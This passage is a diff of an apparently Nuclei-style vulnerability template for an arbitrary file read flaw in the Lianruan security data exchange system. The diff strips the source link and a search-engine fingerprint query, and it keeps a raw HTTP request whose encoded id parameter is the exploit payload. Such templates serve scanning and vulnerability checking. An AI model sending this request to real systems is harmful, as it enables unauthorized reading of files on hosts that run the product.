@@ -3,12 +3,8 @@ info:
   name: 联软安全数据摆渡系统任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tg4bdifb92m0gb2u'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: tg4bdifb92m0gb2u
-    fofa: ZoomEye:app:"联软安全数据交换系统"
 http:
 - raw:
   - 'GET /UniExServices/poserver.zz?pgop=opendiskdoc&id=KmcgY3MtK3IpLSRfOXE9YmpkL2orbBdrKztnJCltInIrbDhyP24rOzhjPHI= HTTP/1.1
